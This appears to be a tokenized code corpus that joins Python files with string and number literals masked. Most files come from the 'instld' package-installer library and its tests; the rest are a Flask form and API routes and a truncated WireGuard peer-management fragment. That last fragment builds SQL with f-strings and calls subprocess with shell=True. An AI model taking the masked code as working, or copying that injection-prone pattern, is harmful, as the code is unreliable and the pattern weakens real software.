'<STR_LIT>' , catch_output = False ) : <EOL> pass <EOL> assert len ( context . getvalue ( ) ) > <NUM_LIT> <EOL> def test_catch_output_true ( ) : <EOL> with redirect_stdout ( StringIO ( ) ) as context : <EOL> with instld ( '<STR_LIT>' , index_url = '<STR_LIT>' , catch_output = True ) : <EOL> pass <EOL> assert len ( context . getvalue ( ) ) == <NUM_LIT> <EOL> def test_install_from_requirements_file ( ) : <EOL> with instld ( index_url = '<STR_LIT>' , r = '<STR_LIT>' ) as context : <EOL> module = context . import_here ( '<STR_LIT>' ) <EOL> assert module . version == '<STR_LIT>' <EOL> def test_set_where_and_check_path ( ) : <EOL> with TemporaryDirectory ( ) as where : <EOL> with instld ( where = where ) : <EOL> assert sys . path [ <NUM_LIT> ] . startswith ( where ) <EOL> assert not sys . path [ <NUM_LIT> ] . startswith ( where ) <EOL> def test_install_after ( ) : <EOL> with instld ( ) as context : <EOL> context . install ( '<STR_LIT>' , index_url = '<STR_LIT>' ) <EOL> module = context . import_here ( '<STR_LIT>' ) <EOL> assert module . version == '<STR_LIT>' <EOL> assert module . function ( <NUM_LIT> , <NUM_LIT> ) == <NUM_LIT> <EOL> </s>
<s> import inspect <EOL> import pytest <EOL> from instld . errors import InstallingPackageError <EOL> from instld . cli . parsing_comments . get_comment_string import get_comment_string_by_frame , get_comment_substring_from_string <EOL> def test_get_comment_started_with_instld ( ) : <EOL> comment = get_comment_string_by_frame ( inspect . currentframe ( ) ) <EOL> assert comment == '<STR_LIT>' <EOL> def test_get_comment_not_started_with_instld ( ) : <EOL> comment = get_comment_string_by_frame ( inspect . currentframe ( ) ) <EOL> assert comment is None <EOL> def test_get_comment_without_comment ( ) : <EOL> comment = get_comment_string_by_frame ( inspect . currentframe ( ) ) <EOL> assert comment is None <EOL> def test_get_comment_wrong ( ) : <EOL> with pytest . raises ( InstallingPackageError ) : <EOL> comment = get_comment_string_by_frame ( inspect . currentframe ( ) ) <EOL> def test_get_comment_substring_from_string ( ) : <EOL> assert get_comment_substring_from_string ( '<STR_LIT>' ) is None <EOL> assert get_comment_substring_from_string ( '<STR_LIT>' ) == '<STR_LIT>' <EOL> with pytest . raises ( InstallingPackageError ) : <EOL> assert get_comment_substring_from_string ( '<STR_LIT>' ) <EOL> </s>
<s> import io <EOL> import os <EOL> import sys <EOL> import traceback <EOL> from typing import List , Dict , Any , Optional <EOL> from dataclasses import dataclass <EOL> from subprocess import CalledProcessError <EOL> from contextlib import redirect_stdout , redirect_stderr <EOL> import pytest <EOL> from instld . cli . main import main <EOL> @ dataclass <EOL> class MainRunResult : <EOL> stdout : bytes <EOL> stderr : bytes <EOL> before_stderr : bytes <EOL> returncode : int <EOL> command : List [ str ] <EOL> def check_returncode ( self ) : <EOL> if self . returncode != <NUM_LIT> : <EOL> raise CalledProcessError ( self . returncode , self . command ) <EOL> @ pytest . fixture <EOL> def main_runner ( ) : <EOL> def runner_function ( arguments : List [ str ] , env : Optional [ Dict [ str , str ] ] = None , universal_newlines : Optional [ bool ] = None , ** kwargs : Any ) : <EOL> old_excepthook = sys . excepthook <EOL> old_argv = sys . argv <EOL> old_environ = os . environ <EOL> old_exit = sys . exit <EOL> old_env = os . environ <EOL> if env is not None : <EOL> os . environ = env <EOL> sys . argv = arguments <EOL> class LocalError ( Exception ) : pass <EOL> def exit_handler ( number ) : raise LocalError <EOL> sys . exit = exit_handler <EOL> stdout_buffer = io . StringIO ( ) <EOL> stderr_buffer = io . StringIO ( ) <EOL> returncode = <NUM_LIT> <EOL> with redirect_stdout ( stdout_buffer ) as stdout , redirect_stderr ( stderr_buffer ) as stderr : <EOL> try : <EOL> main ( ) <EOL> stdout = stdout_buffer . getvalue ( ) <EOL> stderr = stderr_buffer . getvalue ( ) <EOL> before_stderr = str . encode ( stderr ) <EOL> except LocalError : <EOL> returncode = <NUM_LIT> <EOL> stdout = stdout_buffer . getvalue ( ) <EOL> stderr = stderr_buffer . getvalue ( ) <EOL> before_stderr = str . encode ( stderr ) <EOL> except Exception as e : <EOL> returncode = <NUM_LIT> <EOL> sys . excepthook ( type ( e ) , e , e . __traceback__ ) <EOL> stdout = stdout_buffer . getvalue ( ) <EOL> stderr = stderr_buffer . getvalue ( ) <EOL> before_stderr = str . encode ( stderr ) <EOL> if sys . platform . lower ( ) in ( '<STR_LIT>' , ) : <EOL> stdout = stdout . replace ( '<STR_LIT>' , os . linesep ) . replace ( '<STR_LIT>' , '<STR_LIT>' ) <EOL> stderr = stderr . replace ( '<STR_LIT>' , os . linesep ) . replace ( '<STR_LIT>' , '<STR_LIT>' ) <EOL> finally : <EOL> if not ( universal_newlines is not None and universal_newlines ) : <EOL> stdout = str . encode ( stdout ) <EOL> stderr = str . encode ( stderr ) <EOL> result = MainRunResult ( command = arguments , stdout = stdout , stderr = stderr , before_stderr = before_stderr , returncode = returncode ) <EOL> sys . excepthook = old_excepthook <EOL> sys . argv = old_argv <EOL> os . environ = old_environ <EOL> sys . exit = old_exit <EOL> os . environ = old_env <EOL> return result <EOL> return runner_function <EOL> </s>
<s> import sys <EOL> def get_python_file ( ) : <EOL> if len ( sys . argv ) >= <NUM_LIT> : <EOL> return sys . argv [ <NUM_LIT> ] <EOL> </s>
<s> def count_traceback_lenth ( traceback_object ) : <EOL> result = <NUM_LIT> <EOL> while traceback_object is not None : <EOL> result += <NUM_LIT> <EOL> traceback_object = traceback_object . tb_next <EOL> return result <EOL> def cut_base_of_traceback ( traceback_object , base_size ) : <EOL> index = <NUM_LIT> <EOL> while traceback_object is not None : <EOL> if index == base_size : <EOL> return traceback_object <EOL> index += <NUM_LIT> <EOL> traceback_object = traceback_object . tb_next <EOL> def cut_importlib_bug ( traceback_object ) : <EOL> try : <EOL> while traceback_object is not None : <EOL> if not ( traceback_object . tb_frame . f_code . co_filename == '<STR_LIT>' or traceback_object . tb_frame . f_code . co_filename == '<STR_LIT>' ) : <EOL> return traceback_object <EOL> traceback_object = traceback_object . tb_next <EOL> except AttributeError : <EOL> return traceback_object <EOL> </s>
<s> from instld . cli . traceback_cutting . traceback_utils import count_traceback_lenth , cut_base_of_traceback <EOL> def test_count_traceback_lenth_empty ( ) : <EOL> assert count_traceback_lenth ( None ) == <NUM_LIT> <EOL> def test_count_traceback_lenth_not_empty ( ) : <EOL> def function_3 ( ) : <EOL> raise ValueError <EOL> def function_2 ( ) : <EOL> function_3 ( ) <EOL> def function_1 ( ) : <EOL> function_2 ( ) <EOL> try : <EOL> function_1 ( ) <EOL> except ValueError as e : <EOL> assert count_traceback_lenth ( e . __traceback__ ) == <NUM_LIT> <EOL> def test_cut_base_of_traceback ( ) : <EOL> def function_3 ( ) : <EOL> raise ValueError <EOL> def function_2 ( ) : <EOL> function_3 ( ) <EOL> def function_1 ( ) : <EOL> function_2 ( ) <EOL> try : <EOL> function_1 ( ) <EOL> except ValueError as e : <EOL> assert count_traceback_lenth ( e . __traceback__ ) == <NUM_LIT> <EOL> cutted_traceback = cut_base_of_traceback ( e . __traceback__ , <NUM_LIT> ) <EOL> assert count_traceback_lenth ( cutted_traceback ) == <NUM_LIT> <EOL> assert cutted_traceback is e . __traceback__ <EOL> cutted_traceback = cut_base_of_traceback ( cutted_traceback , <NUM_LIT> ) <EOL> assert count_traceback_lenth ( cutted_traceback ) == <NUM_LIT> <EOL> cutted_traceback = cut_base_of_traceback ( cutted_traceback , <NUM_LIT> ) <EOL> assert count_traceback_lenth ( cutted_traceback ) == <NUM_LIT> <EOL> cutted_traceback = cut_base_of_traceback ( cutted_traceback , <NUM_LIT> ) <EOL> assert count_traceback_lenth ( cutted_traceback ) == <NUM_LIT> <EOL> assert cutted_traceback is None <EOL> </s>
<s> import os <EOL> import sys <EOL> import tempfile <EOL> from functools import partial <EOL> from contextlib import contextmanager <EOL> from instld . errors import InstallingPackageError , RunningCommandError <EOL> from instld . module . context import Context <EOL> from instld . module . runner import run_python as standard_runner <EOL> from instld . module . lock import lock <EOL> @ contextmanager <EOL> def search_path ( base_dir , logger , runner ) : <EOL> sys_path = os . path . join ( base_dir , '<STR_LIT>' ) <EOL> standard_runner ( [ '<STR_LIT>' , '<STR_LIT>' , base_dir ] , logger , True ) <EOL> for maybe_directory in os . listdir ( path = sys_path ) : <EOL> maybe_directory_full = os . path . join ( sys_path , maybe_directory ) <EOL> if maybe_directory . startswith ( '<STR_LIT>' ) and os . path . isdir ( maybe_directory_full ) : <EOL> sys_path = os . path . join ( sys_path , maybe_directory , '<STR_LIT>' ) <EOL> break <EOL> with lock : <EOL> sys . path . insert ( <NUM_LIT> , sys_path ) <EOL> yield sys_path <EOL> with lock : <EOL> del sys . path [ sys . path . index ( sys_path ) ] <EOL> @ contextmanager <EOL> def pip_context ( packages_names , options , logger , runner , catch_output , where ) : <EOL> if where is not None : <EOL> @ contextmanager <EOL> def create_temp_directory ( ) : <EOL> yield where <EOL> else : <EOL> create_temp_directory = tempfile . TemporaryDirectory <EOL> with create_temp_directory ( ) as directory : <EOL> with search_path ( directory , logger , runner ) as where : <EOL> try : <EOL> if '<STR_LIT>' in options or '<STR_LIT>' in options : <EOL> runner ( [ '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , f'<STR_LIT>' , * options ] , logger , catch_output ) <EOL> else : <EOL> for package_name in packages_names : <EOL> runner ( [ '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , f'<STR_LIT>' , * options , package_name ] , logger , catch_output ) <EOL> except RunningCommandError as e : <EOL> new_error = InstallingPackageError ( f'<STR_LIT>' ) <EOL> new_error . stdout = e . stdout <EOL> new_error . stderr = e . stderr <EOL> raise new_error from e <EOL> yield Context ( where , logger , catch_output , options , partial ( pip_context , logger = logger , runner = runner , catch_output = catch_output , where = directory ) ) <EOL> </s>
<s> from threading import Lock <EOL> lock = Lock ( ) <EOL> </s>
<s> import sys <EOL> from instld . module . proxy_module import ProxyModule <EOL> sys . modules [ __name__ ] . __class__ = ProxyModule <EOL> </s>
<s> from instld . module . context import Context <EOL> def test_context_repr ( ) : <EOL> assert repr ( Context ( '<STR_LIT>' , None , None , None , None ) ) == '<STR_LIT>' <EOL> def test_context_str ( ) : <EOL> assert str ( Context ( '<STR_LIT>' , None , None , None , None ) ) == '<STR_LIT>' <EOL> </s>
<s> import sys <EOL> import traceback <EOL> from instld . cli . traceback_cutting . traceback_utils import cut_base_of_traceback , cut_importlib_bug <EOL> def create_cutting_excepthook ( old_hook , base_size ) : <EOL> def new_hook ( exc_type , value , traceback_object ) : <EOL> traceback_object = cut_base_of_traceback ( traceback_object , base_size ) <EOL> traceback_object = cut_importlib_bug ( traceback_object ) <EOL> traceback . print_exception ( exc_type , value , traceback_object ) <EOL> return new_hook <EOL> def set_cutting_excepthook ( base_size ) : <EOL> sys . excepthook = create_cutting_excepthook ( sys . excepthook , base_size ) <EOL> </s>
<s> from instld . errors import InstallingPackageError <EOL> </s>
<s> def convert_options ( options ) : <EOL> result = [ ] <EOL> def add_to_buffer ( key , * value , is_option = True ) : <EOL> if len ( value ) == <NUM_LIT> : <EOL> value = value [ <NUM_LIT> ] <EOL> else : <EOL> value = None <EOL> string_variants = ( <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> ) <EOL> bool_variants = ( <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> ) <EOL> if key in string_variants : <EOL> if not isinstance ( value , str ) : <EOL> raise ValueError ( f'<STR_LIT>' ) <EOL> elif key in bool_variants : <EOL> if value is not None : <EOL> raise ValueError ( f'<STR_LIT>' ) <EOL> else : <EOL> raise ValueError ( <EOL> f'<STR_LIT>' <EOL> '<STR_LIT>' <EOL> '<STR_LIT>' <EOL> ) <EOL> if key in ( '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ) : <EOL> raise ValueError ( f'<STR_LIT>' ) <EOL> result . append ( key ) <EOL> if value is not None : <EOL> result . append ( value ) <EOL> for name , value in options . items ( ) : <EOL> name = name . replace ( '<STR_LIT>' , '<STR_LIT>' ) <EOL> if isinstance ( value , str ) : <EOL> if len ( name ) == <NUM_LIT> : <EOL> add_to_buffer ( f'<STR_LIT>' , value ) <EOL> else : <EOL> add_to_buffer ( f'<STR_LIT>' , value ) <EOL> elif isinstance ( value , bool ) : <EOL> if value == True : <EOL> if len ( name ) == <NUM_LIT> : <EOL> add_to_buffer ( f'<STR_LIT>' ) <EOL> else : <EOL> add_to_buffer ( f'<STR_LIT>' ) <EOL> else : <EOL> raise ValueError ( '<STR_LIT>' ) <EOL> return result <EOL> </s>
<s> from dataclasses import dataclass <EOL> from enum import IntEnum , auto <EOL> from typing import Optional <EOL> class RunType ( IntEnum ) : <EOL> script = auto ( ) <EOL> REPL = auto ( ) <EOL> module = auto ( ) <EOL> @ dataclass <EOL> class StateStorage : <EOL> run_type : RunType = RunType . module <EOL> last_string : Optional [ str ] = None <EOL> state_storage = StateStorage ( ) <EOL> </s>
<s> import inspect <EOL> import pytest <EOL> from instld . errors import InstallingPackageError <EOL> from instld . cli . parsing_comments . get_options_from_comments import get_options_from_comments_by_frame <EOL> def test_get_normal_options ( ) : <EOL> options = get_options_from_comments_by_frame ( inspect . currentframe ( ) ) <EOL> assert isinstance ( options , dict ) <EOL> assert len ( options ) == <NUM_LIT> <EOL> assert options [ '<STR_LIT>' ] == '<STR_LIT>' <EOL> assert options [ '<STR_LIT>' ] == '<STR_LIT>' <EOL> @ pytest . mark . skip ( "<STR_LIT>" ) <EOL> def test_real_options ( ) : <EOL> options = get_options_from_comments_by_frame ( inspect . currentframe ( ) ) <EOL> assert options == { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> } <EOL> def test_get_wrong_options ( ) : <EOL> with pytest . raises ( InstallingPackageError ) : <EOL> get_options_from_comments_by_frame ( inspect . currentframe ( ) ) <EOL> with pytest . raises ( InstallingPackageError ) : <EOL> get_options_from_comments_by_frame ( inspect . currentframe ( ) ) <EOL> with pytest . raises ( InstallingPackageError ) : <EOL> get_options_from_comments_by_frame ( inspect . currentframe ( ) ) <EOL> def test_get_empty_options ( ) : <EOL> options = get_options_from_comments_by_frame ( inspect . currentframe ( ) ) <EOL> assert isinstance ( options , dict ) <EOL> assert len ( options ) == <NUM_LIT> <EOL> </s>
<s> from functools import lru_cache <EOL> from instld . errors import InstallingPackageError <EOL> from instld . state_management . storage import state_storage , RunType <EOL> def get_comment_substring_from_string ( string ) : <EOL> splitted_line = string . split ( '<STR_LIT>' ) <EOL> right_part = splitted_line [ <NUM_LIT> : ] <EOL> right_part = '<STR_LIT>' . join ( right_part ) <EOL> right_part = right_part . strip ( ) <EOL> if right_part . startswith ( '<STR_LIT>' ) : <EOL> right_part = right_part [ <NUM_LIT> : ] . strip ( ) <EOL> if right_part : <EOL> return right_part <EOL> else : <EOL> raise InstallingPackageError ( '<STR_LIT>' ) <EOL> @ lru_cache ( ) <EOL> def get_comment_string_from_file ( line_number , file_name ) : <EOL> try : <EOL> with open ( file_name , '<STR_LIT>' ) as file : <EOL> for index , line in enumerate ( file ) : <EOL> if index + <NUM_LIT> == line_number : <EOL> return get_comment_substring_from_string ( line ) <EOL> except ( FileNotFoundError , OSError ) : <EOL> return None <EOL> def get_comment_string_by_frame ( frame ) : <EOL> if state_storage . run_type == RunType . script : <EOL> line_number = frame . f_lineno <EOL> code = frame . f_code <EOL> file_name = code . co_filename <EOL> return get_comment_string_from_file ( line_number , file_name ) <EOL> elif state_storage . run_type == RunType . REPL : <EOL> return get_comment_substring_from_string ( state_storage . last_string ) <EOL> </s>
<s> class EmptyLogger : <EOL> def debug ( self , * args , ** kwargs ) : pass <EOL> def info ( self , * args , ** kwargs ) : pass <EOL> def warning ( self , * args , ** kwargs ) : pass <EOL> def error ( self , * args , ** kwargs ) : pass <EOL> def exception ( self , * args , ** kwargs ) : pass <EOL> </s>
<s> import sys <EOL> from instld . module . command_executer import CommandExecuter <EOL> def run_python ( args , logger , catch_output ) : <EOL> all_args = [ sys . executable , * args ] <EOL> executer = CommandExecuter ( all_args , catch_output = catch_output , logger = logger ) <EOL> executer . run ( ) <EOL> </s>
<s> import pytest <EOL> from instld . common_utils . convert_options import convert_options <EOL> def test_convert_options ( ) : <EOL> assert convert_options ( { '<STR_LIT>' : '<STR_LIT>' } ) == [ '<STR_LIT>' , '<STR_LIT>' ] <EOL> assert convert_options ( { '<STR_LIT>' : True } ) == [ '<STR_LIT>' ] <EOL> assert convert_options ( { '<STR_LIT>' : False } ) == [ ] <EOL> assert convert_options ( { '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : True } ) == [ '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ] <EOL> def test_convert_options_wrong ( ) : <EOL> with pytest . raises ( ValueError ) : <EOL> convert_options ( { '<STR_LIT>' : '<STR_LIT>' } ) <EOL> with pytest . raises ( ValueError ) : <EOL> convert_options ( { '<STR_LIT>' : '<STR_LIT>' } ) <EOL> with pytest . raises ( ValueError ) : <EOL> convert_options ( { '<STR_LIT>' : '<STR_LIT>' } ) <EOL> with pytest . raises ( ValueError ) : <EOL> convert_options ( { '<STR_LIT>' : '<STR_LIT>' } ) <EOL> with pytest . raises ( ValueError ) : <EOL> convert_options ( { '<STR_LIT>' : True } ) <EOL> with pytest . raises ( ValueError ) : <EOL> convert_options ( { '<STR_LIT>' : '<STR_LIT>' } ) <EOL> with pytest . raises ( ValueError ) : <EOL> convert_options ( { '<STR_LIT>' : True } ) <EOL> with pytest . raises ( ValueError ) : <EOL> convert_options ( { '<STR_LIT>' : <NUM_LIT> } ) <EOL> </s>
<s> import sys <EOL> from threading import Thread , Lock <EOL> from subprocess import Popen , PIPE <EOL> from instld . module . empty_logger import EmptyLogger <EOL> from instld . errors import RestartingCommandError , RunningCommandError <EOL> class CommandExecuter : <EOL> def __init__ ( self , arguments , catch_output = True , logger = EmptyLogger ( ) ) : <EOL> self . arguments = arguments <EOL> self . arguments_string_representation = '<STR_LIT>' . join ( self . arguments ) <EOL> self . catch_output = catch_output <EOL> self . logger = logger <EOL> self . stdout = [ ] <EOL> self . stderr = [ ] <EOL> self . running = False <EOL> self . done = False <EOL> self . lock = Lock ( ) <EOL> def run ( self ) : <EOL> with self . lock : <EOL> if self . done or self . running : <EOL> raise RestartingCommandError ( '<STR_LIT>' ) <EOL> self . running = True <EOL> self . logger . info ( f'<STR_LIT>' ) <EOL> with Popen ( self . arguments , stdout = PIPE , stderr = PIPE , bufsize = <NUM_LIT> , universal_newlines = True ) as process : <EOL> stderr_reading_thread = Thread ( target = self . read_stderr , args = ( process , ) ) <EOL> stderr_reading_thread . start ( ) <EOL> for line in process . stdout : <EOL> self . stdout . append ( line ) <EOL> if not self . catch_output : <EOL> print ( line , end = '<STR_LIT>' ) <EOL> stderr_reading_thread . join ( ) <EOL> self . done = True <EOL> self . running = False <EOL> if process . returncode != <NUM_LIT> : <EOL> message = f'<STR_LIT>' <EOL> self . logger . error ( message ) <EOL> exception = RunningCommandError ( message ) <EOL> exception . stdout = '<STR_LIT>' . join ( self . stdout ) <EOL> exception . stderr = '<STR_LIT>' . join ( self . stderr ) <EOL> raise exception <EOL> self . logger . info ( f'<STR_LIT>' ) <EOL> def read_stderr ( self , process ) : <EOL> for line in process . stderr : <EOL> self . stderr . append ( line ) <EOL> if not self . catch_output : <EOL> sys . stderr . write ( line ) <EOL> </s>
<s> class InstallingPackageError ( Exception ) : <EOL> pass <EOL> class RestartingCommandError ( Exception ) : <EOL> pass <EOL> class RunningCommandError ( Exception ) : <EOL> pass <EOL> class CommentFormatError ( Exception ) : <EOL> pass <EOL> </s>
<s> from sqlalchemy import func <EOL> from flask_wtf import FlaskForm <EOL> from wtforms import StringField , PasswordField , SubmitField <EOL> from wtforms . validators import Length , EqualTo , DataRequired , Email , ValidationError <EOL> from app . models . user import User <EOL> class RegistrationForm ( FlaskForm ) : <EOL> username = StringField ( '<STR_LIT>' , validators = [ DataRequired ( ) , Length ( min = <NUM_LIT> , max = <NUM_LIT> ) ] ) <EOL> email = StringField ( '<STR_LIT>' , validators = [ DataRequired ( ) , Email ( ) ] ) <EOL> password = PasswordField ( '<STR_LIT>' , validators = [ DataRequired ( ) , Length ( min = <NUM_LIT> ) ] ) <EOL> confirm_password = PasswordField ( '<STR_LIT>' , validators = [ <EOL> DataRequired ( ) , EqualTo ( '<STR_LIT>' , message = '<STR_LIT>' ) <EOL> ] ) <EOL> submit = SubmitField ( '<STR_LIT>' ) <EOL> def validate_username ( self , username : StringField ) -> None : <EOL> user = User . query . filter ( func . lower ( User . username ) == func . lower ( username . data ) ) . first ( ) <EOL> if user : <EOL> raise ValidationError ( '<STR_LIT>' ) <EOL> def validate_email ( self , email : StringField ) -> None : <EOL> user = User . query . filter ( func . lower ( User . email ) == func . lower ( email . data ) ) . first ( ) <EOL> if user : <EOL> raise ValidationError ( '<STR_LIT>' ) <EOL> </s>
<s> from . routes import api <EOL> from flask import Flask <EOL> def init_app ( app : Flask ) -> None : <EOL> app . register_blueprint ( api ) <EOL> </s>
<s> from pathlib import Path <EOL> APP_PATH = Path ( ) . resolve ( ) <EOL> </s>
<s> from flask import render_template , jsonify , Response , abort <EOL> from flask_login import login_required , current_user <EOL> from app . models import Channel <EOL> from app . schemas import ChannelSchema <EOL> from . base import api <EOL> from . utils import check_token , check_user <EOL> @ api . route ( '<STR_LIT>' ) <EOL> @ login_required <EOL> def settings ( ) -> Response : <EOL> token = current_user . generate_api_token ( ) <EOL> return render_template ( '<STR_LIT>' , token = token ) <EOL> @ api . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> def show_channels ( ) -> Response : <EOL> token = check_token ( ) <EOL> user = check_user ( token ) <EOL> channels = [ <EOL> Channel . query . get ( allowed_record . channel_id ) <EOL> for allowed_record in user . allowed_channels <EOL> ] <EOL> channel_schema = ChannelSchema ( ) <EOL> return jsonify ( channel_schema . dump ( channels , many = True ) ) <EOL> @ api . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> def show_channel ( name : str ) -> Response : <EOL> token = check_token ( ) <EOL> user = check_user ( token ) <EOL> channel = [ <EOL> Channel . query . get ( allowed_record . channel_id ) <EOL> for allowed_record in user . allowed_channels <EOL> if Channel . query . get ( allowed_record . channel_id ) . name == name <EOL> ] <EOL> if not channel : <EOL> abort ( <NUM_LIT> , description = f'<STR_LIT>' ) <EOL> else : <EOL> channel = channel [ <NUM_LIT> ] <EOL> channel_schema = ChannelSchema ( ) <EOL> return jsonify ( channel_schema . dump ( channel ) ) <EOL> </s>
<s> import ipaddress , subprocess , datetime , os , util <EOL> from util import * <EOL> notEnoughParameter = { "<STR_LIT>" : False , "<STR_LIT>" : "<STR_LIT>" } <EOL> good = { "<STR_LIT>" : True , "<STR_LIT>" : "<STR_LIT>" } <EOL> def ret ( status = True , reason = "<STR_LIT>" , data = "<STR_LIT>" ) : <EOL> return { "<STR_LIT>" : status , "<STR_LIT>" : reason , "<STR_LIT>" : data } <EOL> def togglePeerAccess ( data , g ) : <EOL> checkUnlock = g . cur . execute ( f"<STR_LIT>" ) . fetchone ( ) <EOL> if checkUnlock : <EOL> moveUnlockToLock = g . cur . execute ( <EOL> f"<STR_LIT>" ) <EOL> if g . cur . rowcount == <NUM_LIT> : <EOL> print ( g . cur . rowcount ) <EOL> print ( util . deletePeers ( data [ '<STR_LIT>' ] , [ data [ '<STR_LIT>' ] ] , g . cur , g . db ) ) <EOL> else : <EOL> moveLockToUnlock = g . cur . execute ( <EOL> f"<STR_LIT>" ) . fetchone ( ) <EOL> try : <EOL> if len ( moveLockToUnlock [ - <NUM_LIT> ] ) == <NUM_LIT> : <EOL> status = subprocess . check_output ( <EOL> f"<STR_LIT>" , <EOL> shell = True , stderr = subprocess . STDOUT ) <EOL> else : <EOL> now = str ( datetime . datetime . now ( ) . strftime ( "<STR_LIT>" ) ) <EOL> f_name = now + "<STR_LIT>" <EOL> f = open ( f_name , "<STR_LIT>" ) <EOL> f . write ( moveLockToUnlock [ - <NUM_LIT> ] ) <EOL> f . close ( ) <EOL> subprocess . check_output ( <EOL> f"<STR_LIT>" , <EOL> shell = True , stderr = subprocess . STDOUT ) <EOL> os . remove ( f_name ) <EOL> status = subprocess . check_output ( f"<STR_LIT>" , shell = True , stderr = subprocess . STDOUT ) <EOL> g . cur . execute ( <EOL> f"<STR_LIT>" ) <EOL> if g . cur . rowcount == <NUM_LIT> : <EOL> g . cur . execute ( f"<STR_LIT>" ) <EOL> except subprocess . CalledProcessError as exc : <EOL> return { "<STR_LIT>" : False , "<STR_LIT>" : str ( exc . output . strip ( ) ) } <EOL> return good <EOL> class addConfiguration : <EOL> def AddressCheck ( self , data ) : <EOL> address = data [ '<STR_LIT>' ] <EOL> address = address . replace ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> address = address . split ( '<STR_LIT>' ) <EOL> amount = <NUM_LIT> <EOL> for i in address : <EOL> try : <EOL> ips = ipaddress . ip_network ( i , False ) <EOL> amount += ips . num_addresses <EOL> except ValueError as e : <EOL> return { "<STR_LIT>" : False , "<STR_LIT>" : str ( e ) } <EOL> if amount >= <NUM_LIT> : <EOL> return { "<STR_LIT>" : True , "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : f"<STR_LIT>" } <EOL> else : <EOL> return { "<STR_LIT>" : True , "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : f"<STR_LIT>" } <EOL> def PortCheck ( self , data , configs ) : <EOL> port = data [ '<STR_LIT>' ] <EOL> if ( not port . isdigit ( ) ) or int ( port ) < <NUM_LIT> or int ( port ) > <NUM_LIT> : <EOL> return { "<STR_LIT>" : False , "<STR_LIT>" : f"<STR_LIT>" } <EOL> for i in configs : <EOL> if i [ '<STR_LIT>' ] == port : <EOL> return { "<STR_LIT>" : False , "<STR_LIT>" : f"<STR_LIT>" } <EOL> return good <EOL> def NameCheck ( self , data , configs ) : <EOL> name = data [ '<STR_LIT>' ] <EOL> name = name . replace ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> for i in configs : <EOL> if name == i [ '<STR_LIT>' ] : <EOL> return { "<STR_LIT>" : False , "<STR_LIT>" : f"<STR_LIT>" } <EOL> illegal_filename = [ "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , '<STR_LIT>' '<STR_LIT>' , "<STR_LIT>" , "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , <EOL> "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ] <EOL> for i in illegal_filename : <EOL> name = name . replace ( i , "<STR_LIT>" ) <EOL> if len ( name ) == <NUM_LIT> : <EOL> return { "<STR_LIT>" : False , "<STR_LIT>" : "<STR_LIT>" } <EOL> return good <EOL> def addConfiguration ( self , data , configs , WG_CONF_PATH ) : <EOL> output = [ "<STR_LIT>" , "<STR_LIT>" ] <EOL> required = [ '<STR_LIT>' , '<STR_LIT>' , <EOL> '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , <EOL> '<STR_LIT>' , '<STR_LIT>' ] <EOL> for i in required : <EOL> e = data [ i ] <EOL> if len ( e ) != <NUM_LIT> : <EOL> key = i . replace ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> o = f"<STR_LIT>" <EOL> output . append ( o ) <EOL> name = data [ '<STR_LIT>' ] <EOL> illegal_filename = [ "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , '<STR_LIT>' '<STR_LIT>' , "<STR_LIT>" , "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> 